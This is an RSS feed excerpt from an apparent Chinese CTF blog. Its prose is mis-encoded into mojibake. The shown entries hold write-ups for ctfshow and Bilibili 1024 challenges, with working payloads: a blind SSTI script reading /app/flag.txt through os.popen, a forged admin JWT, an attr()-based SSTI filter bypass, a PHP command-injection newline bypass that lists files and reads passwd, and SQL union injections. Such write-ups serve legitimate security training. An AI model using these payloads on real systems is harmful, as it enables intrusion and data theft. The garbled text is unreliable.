&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template_string&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask_limiter&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Limiter&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask_limiter.util&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">get_remote_address&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">limiter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Limiter&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">key_func&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">get_remote_address&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">default_limits&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;10000 per hour&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@limiter&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">limit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;5/second&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">override_defaults&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\x3c&lt;/span>&lt;span style="color:#d88200">pre&lt;/span>&lt;span style="color:#8045ff">\x3e\x3c&lt;/span>&lt;span style="color:#d88200">code&lt;/span>&lt;span style="color:#8045ff">\x3e&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#8045ff">\x3c&lt;/span>&lt;span style="color:#d88200">/code&lt;/span>&lt;span style="color:#8045ff">\x3e\x3c&lt;/span>&lt;span style="color:#d88200">/pre&lt;/span>&lt;span style="color:#8045ff">\x3e&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__file__&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">@limiter&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">limit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;5/second&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">override_defaults&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/ssti&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">check&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/app/flag.txt&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">strip&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#34;input&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">query&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;input&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">render_template_string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Thank you for your input.&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;No input found.&amp;#34;&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">80&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Â±û‰∫éÊòØchar-by-charÁ±ªÂûãÁõ≤Ê≥®ÂíåsstiÁöÑÁªìÂêàÔºåÈôêÂà∂‰∫Ü1Áßí5Ê¨°ËØ∑Ê±ÇÔºåÊâÄ‰ª•ÈúÄË¶ÅÊàë‰ª¨ÁâπÊÑèÈôêÂà∂‰∏Ä‰∏ã&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">_url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://9a5415f7-b712-423d-b7d4-7f2d61665f95.challenge.ctf.show/ssti?input=&amp;#39;&lt;/span>
&lt;span style="color:#111">_payload_1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;{%25 set flag=config.__class__.__init__.__globals__[&amp;#39;os&amp;#39;].popen(&amp;#39;cat /app/flag.txt&amp;#39;).read()%25}{%25 set sleep=config.__class__.__init__.__globals__[&amp;#39;os&amp;#39;].popen(&amp;#39;sleep 2.5&amp;#39;)%25}{&lt;/span>&lt;span style="color:#d88200">%25i&lt;/span>&lt;span style="color:#d88200">f &amp;#39;&amp;#34;&lt;/span>
&lt;span style="color:#111">_payload_2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; in flag%25}{{sleep.read()}}{&lt;/span>&lt;span style="color:#d88200">%25e&lt;/span>&lt;span style="color:#d88200">ndif%25}&amp;#34;&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">charset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;abcdefghijklmnopqrstuvwxyz0123456789-_&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;ctfshow{&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">_&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">content&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">i&lt;/span>
&lt;span style="color:#75715e"># print(data)&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_url&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">_payload_1&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">_payload_2&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">timeout&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">2.5&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2.5&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÊúâÂ∞èÊ¶ÇÁéá‰ºöÂ¥©ÔºåÂèØ‰ª•Â§öË∑ë‰∏ÄÊ¨°&lt;/p>
&lt;h2 id="ÈÄöÂÖ≥Â§ß‰Ω¨">ÈÄöÂÖ≥Â§ß‰Ω¨&lt;/h2>
&lt;p>ÁôªÂΩïÔºåÂ∞ùËØïadmin: adminÔºåÂõûÊòæ ‰Ω†‰∏çËÉΩ‰ª•ÁÆ°ÁêÜÂëòË¥¶Âè∑ÁôªÂΩïÔºåÊäìÂåÖÁúãÂà∞jwtÔºåÂÖàÁî®jwt.ioÊ¢≠‰∏Ä‰∏ã&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211115110336856.png" alt="image-20211115110336856">&lt;/p>
&lt;p>ÂÜçÁî®c-jwt-crackerÊ¢≠‰∏Ä‰∏ãÔºåÁàÜÂá∫Êù•key=12345Ôºà‰∏çËøáËØ¥ÂÆûËØùÊàëËøôÈáåÁúüÊ≤°ÁàÜÂá∫Êù•ÔºâÔºåÂÜçÁî®jwt.ioÊîπ‰∏Ä‰∏ãuserÂíåexp&lt;/p>
&lt;pre tabindex="0">&lt;code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJleHAiOjE2MzY5NTUwNjR9.jEw2QuCd67ZRC_eAVynhcZTYAyjHSxfrrpkqEF98Uio
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211115120908659.png" alt="image-20211115120908659">&lt;/p>
&lt;p>ÁúãÂà∞ËøôÁßçÁöÑÊ°ÜÔºåÁõ¥ËßâÂ∞±ÊòØsqli, xss, sstiÔºõÂä†‰∏äjwt‰∏ÄËà¨flask‰ºöÁî®ÔºåËØï‰∏Ä‰∏ãsstiÔºåÊûúÁÑ∂&lt;/p>
&lt;p>ËøôÈáåÁöÑÈÄöÂÖ≥‰∫∫ÂØπÈïøÂ∫¶ËøõË°å‰∫ÜÈôêÂà∂ÔºåÊéíÂêçÈúÄË¶ÅÊòØÊï∞Â≠óÔºåÊó∂Èó¥Ê≤°ÊúâÂï•ÂøÖË¶ÅÊîπÔºåÊÑüË®Ä‰∏çÈôêÈïøÂ∫¶Ôºå‰ΩÜÊòØËøáÊª§‰∫Ü‰∏ÄÁ•®Â≠óÁ¨¶ÔºàÂçïÂèåÂºïÂè∑ÔºàÊó†Ê≥ïÁî®hexÂíåÊãºÊé•ÔºâÔºå‰∏ãÂàíÁ∫øÔºårequestÔºå‰∏≠Êã¨Âè∑ÔºåÁôæÂàÜÂè∑ÔºàÊó†Ê≥ïforËØ≠Âè•ÈÅçÂéÜ Â¶ÇÊûúÁî®chr()ËøòÂæóÁàÜÁ†¥ÔºâÔºåÁÆóÊòØÊØîËæÉ‰∏•Ê†ºÁöÑ‰∫ÜÔºâÔºåÂèØ‰ª•Áî®&lt;code>|attr()&lt;/code>ËøôÊ†∑ÁöÑÂΩ¢ÂºèÊù•ÁªïËøáÔºåÁúã‰∫Üwp‰πãÂêéÂèëÁé∞ËøôÈáåËøòÁªìÂêà‰∫Ü&lt;code>request.args&lt;/code>Ôºå‰πüÂ∞±ÊòØÂä†‰∏Ä‰∫õgetÂèÇÊï∞ÁÑ∂ÂêéÂú®postÁöÑÈÉ®ÂàÜËøõË°åÂºïÁî®ÔºåÂÜçÂÖÖÂàÜÂà©Áî®configËøô‰∏™ÂØπË±°ÔºàÂâçÈù¢ÈÇ£‰∏™ÂéüÈ¢ò‰πüÊòØÂÖÖÂàÜÁî®‰∫ÜconfigÔºâÔºåpayload:&lt;/p>
&lt;pre tabindex="0">&lt;code>/edit?a=__init__&amp;amp;b=__globals__&amp;amp;c=__getitem__&amp;amp;d=os&amp;amp;e=popen&amp;amp;f=whoami&amp;amp;g=read
POST: name={%25set%20r=request.args%25}&amp;amp;rank=1&amp;amp;speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}&amp;amp;time=2021Âπ¥11Êúà11Êó•
&lt;/code>&lt;/pre></description></item><item><title>Bilibili 1024ÂÆâÂÖ®ÊîªÈò≤ Wp</title><link>https://amiaaaz.github.io/2021/11/14/bilibili-sec1024-wp/</link><pubDate>Sun, 14 Nov 2021 20:15:47 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/14/bilibili-sec1024-wp/</guid><description>&lt;h2 id="ÂÆâÂÖ®ÊîªÈò≤--1">ÂÆâÂÖ®ÊîªÈò≤&amp;ndash;1&lt;/h2>
&lt;blockquote>
&lt;p>&lt;a href="https://security.bilibili.com/sec1024/q/r1.html">https://security.bilibili.com/sec1024/q/r1.html&lt;/a> | &lt;a href="https://baike.baidu.com/item/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86/468774">ÊèêÁ§∫&lt;/a>&lt;/p>
&lt;p>1024Á®ãÂ∫èÂëòËäÇÔºåÂ§ßÂÆ∂‰∏ÄËµ∑Âíå2233ÂèÇ‰∏éËß£ÂØÜÊ∏∏ÊàèÂêß~
happy_1024_2233:
e9ca6f21583a1533d3ff4fd47ddc463c6a1c7d2cf084d364
0408abca7deabb96a58f50471171b60e02b1a8dbd32db156&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114154001444.png" alt="image-20211114154001444">&lt;/p>
&lt;p>&lt;code>a1cd5f84-27966146-3776f301-64031bb9&lt;/code>&lt;/p>
&lt;h2 id="ÂÆâÂÖ®ÊîªÈò≤--2">ÂÆâÂÖ®ÊîªÈò≤&amp;ndash;2&lt;/h2>
&lt;blockquote>
&lt;p>&lt;a href="https://security.bilibili.com/sec1024/q/">https://security.bilibili.com/sec1024/q/&lt;/a> | &lt;a href="https://cli.vuejs.org/zh/config/#productionsourcemap">ÊèêÁ§∫&lt;/a>&lt;/p>
&lt;p>ÊüêÈ´òÁ∫ßÂâçÁ´ØÂºÄÂèëÊîªÂüéÁãÆÊõ¥Êîπ‰∫Ü‰∏Ä‰∏™ÂâçÁ´ØÈÖçÁΩÆÈ°π&lt;/p>
&lt;/blockquote>
&lt;p>ÊèêÁ§∫‰∏≠ÁªôÁöÑÊòØvueÁöÑÂÆòÊñπÊñáÊ°£ÔºåÂπ∂‰∏îÂÆö‰ΩçÂà∞‰∫ÜproductionSourceMap&lt;/p>
&lt;p>Êù•‰∏ÄÊ≥¢f12&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114154330638.png" alt="image-20211114154330638">&lt;/p>
&lt;p>&lt;code>36c7a7b4-cda04af0-8db0368d-b5166480&lt;/code>&lt;/p>
&lt;h2 id="ÂÆâÂÖ®ÊîªÈò≤--3">ÂÆâÂÖ®ÊîªÈò≤&amp;ndash;3&lt;/h2>
&lt;blockquote>
&lt;p>&lt;a href="https://security.bilibili.com/sec1024/q/eval.zip">https://security.bilibili.com/sec1024/q/eval.zip&lt;/a> | &lt;a href="https://www.php.net/manual/zh/function.preg-match.php">ÊèêÁ§∫&lt;/a>&lt;/p>
&lt;p>PHP is the best language for web programming, but what about other languages?&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75715e">/*
&lt;/span>&lt;span style="color:#75715e"> bilibili- ( „Çú- „Çú)„Å§„É≠ ‰πæÊùØ~
&lt;/span>&lt;span style="color:#75715e"> uat: http://192.168.3.2/uat/eval.php
&lt;/span>&lt;span style="color:#75715e"> pro: http://security.bilibili.com/sec1024/q/pro/eval.php
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#111">$args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;args&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">count&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$args&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#75af00">count&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$args&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/^\w+$/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$args&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">// todo: other filter
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;/bin/2233 &amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#75af00">implode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$args&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$cmd&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$out&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#75af00">count&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$out&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$out&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;br&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂèØ‰ª•getÊñπÂºèÊé•Êî∂ÊúÄÂ§ö3‰∏™Âêç‰∏∫argsÁöÑÂèÇÊï∞ÔºåÂØπÊØè‰∏™ÂèÇÊï∞ÁöÑÂÄºËøõË°åÊ≠£ÂàôÂåπÈÖçÔºåÊúÄÂêéÊãºÊé•Âà∞$cmdÂêéÈù¢Ë¢´execÊâßË°åÔºåÁî®%0aÊç¢Ë°å+Êï∞ÁªÑ[]ÁªïËøá&lt;/p>
&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>https://security.bilibili.com/sec1024/q/pro/eval.php?args[]=1%0a&amp;amp;args[]=ls
https://security.bilibili.com/sec1024/q/pro/eval.php?args[]=1%0a&amp;amp;args[]=cat&amp;amp;args[]=passwd
&lt;/code>&lt;/pre>&lt;p>&lt;code>9d3c3014-6c6267e7-086aaee5-1f18452a&lt;/code>&lt;/p>
&lt;h2 id="ÂÆâÂÖ®ÊîªÈò≤--4">ÂÆâÂÖ®ÊîªÈò≤&amp;ndash;4&lt;/h2>
&lt;blockquote>
&lt;p>&lt;a href="https://security.bilibili.com/sec1024/q/">https://security.bilibili.com/sec1024/q/&lt;/a> | &lt;a href="https://baike.baidu.com/item/sql%E6%B3%A8%E5%85%A5/150289">ÊèêÁ§∫&lt;/a>&lt;/p>
&lt;p>ÊáÇÁöÑÈÉΩÊáÇ&lt;/p>
&lt;/blockquote>
&lt;p>Êúâ‰∏™ËØ∑Ê±Çapi &lt;a href="https://security.bilibili.com/sec1024/q/admin/api/v1/log/list">https://security.bilibili.com/sec1024/q/admin/api/v1/log/list&lt;/a>ÔºåÊú¨ËÉΩÁöÑÂéªfuzz‰∏Ä‰∏ãÔºåÁªìÊûú412‰∫Ü‚Ä¶‚Ä¶QAQ&lt;/p>
&lt;p>usernameÈÉ®ÂàÜÂèØ‰ª•sqliÔºåËøáÊª§‰∫ÜÁ©∫Ê†ºÂíåÂçïÂºïÂè∑ÔºåÁî®Ê≥®ÈáäÂíå16ËøõÂà∂ÁªïËøá&lt;/p>
&lt;p>payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">&lt;span style="color:#d88200">&amp;#34;user_name&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;1/**/union/**/select/**/database(),user(),3,4,5&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;user_name&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;1/**/union/**/select/**/database(),user(),3,4,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;user_name&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;1/**/union/**/select/**/database(),user(),3,4,group_concat(id)/**/from/**/flag#&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">,&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>3d5dd579-0678ef93-18b70cae-cabc5d51&lt;/code>&lt;/p>
&lt;hr>
&lt;p>ÈöæÂ∫¶Â∫îËØ•ÁÆóÊòØÂÅèÁÆÄÂçïÁöÑÔºåÂ∞±ÊòØÔºåemmmmmmmmmm&lt;/p>
&lt;p>ÁÆó‰∫ÜÔºåÊàë‰∏çÂ•ΩËØ¥&lt;/p></description></item><item><title>buuojÂä†Âõ∫È¢ò Wp</title><link>https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/</link><pubDate>Sun, 07 Nov 2021 08:57:29 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/07/buuoj-fixchalls-wp/</guid><description>&lt;p>buuojÊñ∞‰∏ä‰∫ÜÂä†Âõ∫È¢òËøô‰∏™ÂàÜÁ±ªÔºå‰πüÂ∞±ÊòØÁ∫ø‰∏ãawdp‰∏≠fixÁöÑÈÉ®ÂàÜÔºåÂè™Ë¶ÅÂ∞ÜÈù∂Êú∫‰∏≠Â≠òÂú®ÁöÑÊºèÊ¥û‰øÆÂ§çÂ•ΩÂπ∂ÈÄöËøácheckÁöÑÊ£ÄÊµãÂç≥ÂèØÊãøÂà∞flagÔºõÊúâ‰∏ÄËØ¥‰∏ÄÔºåÊØîÂçïÁ∫ØattackÊãøflag‰ºöÁÆÄÂçïÂæàÂ§öÔºàÈÄÇÂêàÊàëËøôÁßçÊ≤∏Áâ©web&lt;/p>
